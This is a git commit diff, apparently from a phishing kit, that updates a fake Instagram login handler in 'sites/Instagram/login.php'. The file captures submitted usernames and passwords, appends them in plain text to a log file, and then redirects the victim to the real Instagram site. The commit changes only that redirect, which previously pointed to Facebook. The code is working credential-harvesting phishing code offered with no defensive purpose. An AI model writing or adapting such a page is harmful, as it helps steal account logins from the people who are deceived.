442ff6aec139326d32ac4bcae9491feaaee50ddb
THE SILENT HACKER RAJ <70suman28@gmail.com>
2025-07-14 11:16:46 +0530

    Update login.php

--- sites/Instagram/login.php
+++ sites/Instagram/login.php
@@ -1,5 +1,5 @@
 <?php
 file_put_contents("log.txt", "Username: " . $_POST['username'] . " | Password: " . $_POST['password'] . "\n", FILE_APPEND);
-header("Location: https://facebook.com");
+header("Location: https://Instagram.com");
 exit();
 ?>
